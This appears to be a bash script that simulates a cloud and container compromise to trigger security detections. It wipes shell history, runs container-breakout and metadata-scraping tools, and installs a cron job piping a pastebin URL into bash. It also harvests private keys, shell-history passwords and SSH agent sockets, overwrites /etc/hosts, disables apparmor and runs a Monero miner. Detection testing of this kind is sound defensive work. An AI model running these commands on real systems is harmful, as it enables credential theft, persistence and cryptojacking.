#!/usr/bin/env bash
#
# CloudAndContainerCompromiseSimulator
# 
# This can be used an easy way of triggering detections for cloud and container compromise scenarios
# Do not run this on production systems
#
#

echo = `date` - Setting Up =

echo Wiping Bash History, before starting execution
# https://github.com/uber-common/metta/blob/master/MITRE/Defense_Evasion/defenseevasion_linux_unset_histfile.yml
unset HISTFILE
rm ~/.bash_history
cat /dev/null > ~/.bash_history
history -c

echo Setting fake AWS Credentials to be stolen later
mkdir /root/.aws
echo "[default]" >> /root/.aws/credentials
echo "aws_access_key_id = AKAAAAAAA_AccessKey" >> /root/.aws/credentials
echo "aws_secret_access_key = qLlZ_SecretKey" >> /root/.aws/credentials



if [ -n "$(command -v yum)" ]; then
    yum update -y
    amazon-linux-extras -y install docker
    yum install -y docker
    service docker start
fi

echo = Running Cloud and Container Pen-Test Tools =

echo Copying Binaries to /tmp for Execution
mkdir /tmp/bins
cp ./bins/* /tmp/bins
chmod +x /tmp/bins/*

echo Running Break Out The Box
timeout 60 /tmp/bins/botb -scrape-gcp=true -recon=true -metadata=true -find-http=true -find-sockets=true -find-docker=true -pwnKeyctl=true -k8secrets=true -pwn-privileged= -autopwn=true -keyMin=0 -keyMax=100000000 -k8secrets=true > /tmp/botb_output.txt

echo Running kubeletmein
timeout 60 /tmp/bins/kubeletmein generate > /tmp/kubeletmein_output.txt
timeout 60 /tmp/bins/kubeletmein gke bootstrap >> /tmp/kubeletmein_output.txt
timeout 60 /tmp/bins/kubeletmein gke generate -n anything >> /tmp/kubeletmein_output.txt

echo Running DigitalOCean Pwner
timeout 5 curl -qs http://169.254.169.254/metadata/v1/user-data > user-data.txt
timeout 5 /tmp/bins/dopwn exploit -f user-data.txt

echo Running amicontained Recon tool
timeout 60 /tmp/bins/amicontained

echo Running DeepCe
timeout 60 /tmp/bins/deepce.sh > /tmp/deepce.txt

echo Running AWS Dump
timeout 60 /tmp/bins/aws_dump.sh > /tmp/aws_dump.txt

echo Running go-pillage-registries
timeout 60 /tmp/bins/.pilreg 127.0.0.1:5000 > /tmp/pillreg.txt

echo Executing peirates in interactive mode
/tmp/bins/peirates

echo = Running Classic Mining Worm Capabilities =

echo Adding to cron
# This just runs "echo Hello World"
echo "* * * * * https://pastebin.com/raw/XCkjzVUv | bash > /tmp/cron.txt 2>&" | crontab -

echo Searching for keys
# https://github.com/uber-common/metta/blob/master/MITRE/Credential_Access/credacces_linux_searchprivatekeys.yaml
grep /home/ -irw -e "BEGIN RSA PRIVATE" 2>/dev/null > rsa_keys.txt
grep /home/ -irw -e "BEGIN DSA PRIVATE" 2>/dev/null > dsa_keys.txt

echo Searching for credentials in bash history
# https://github.com/uber-common/metta/blob/master/MITRE/Credential_Access/credaccess_linux_bash_history.yml
cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_bash.txt
cat loot_bash.txt
cat ~/.sh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt
cat loot_sh.txt
cat ~/.zsh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_zsh.txt
cat loot_zsh.txt

echo Adding Custom DNS
echo '1.91.204.131 api.nanopool.org' > /etc/hosts

echo Kill existing miners
killall -9 kinsing

echo XMRig Optimisation
sysctl -w vm.nr_hugepages=128

echo Adding SSH Hijack
# https://github.com/uber-common/metta/blob/master/MITRE/Lateral_Movement/lateralmovement_linux_ssh_hijack.yml
grep ~/.ssh/config -e ForwardAgent
ps ef |grep -i -e "ssh-agent"
cat /proc/*/environ |tr -s '\0' '\n' | grep SSH_AUTH_SOCK |sort -u 2>/dev/null > ssh_agent.txt

echo DNS Request for mining pool
timeout 5 curl https://api.nanopool.org/

echo Set SSH Key Access
chattr -iae /root/.ssh/
chattr -iae /root/.ssh/authorized_keys

echo Download Aliyun Agent Uninstaller
curl http://update.aegis.aliyun.com/download/uninstall.sh

echo Search for Monero Docker images
docker images -a | grep "auto"

echo Create backup invalid ssh account
mkdir /home/temp_user/.ssh/ -p
echo "" > /home/temp_user/.ssh/authorized_keys  
chmod 600 /home/temp_user/.ssh/authorized_keys

echo Disable apparmor
service apparmor stop
systemctl disable apparmor
systemctl enable apparmor
service apparmor stop

echo Disable NMI watchdog
echo '0' >/proc/sys/kernel/nmi_watchdog
echo '1' >/proc/sys/kernel/nmi_watchdog

echo Running Stratum Protocol via XMRIG
timeout 20 /tmp/bins/xmrig

echo `date` - Finished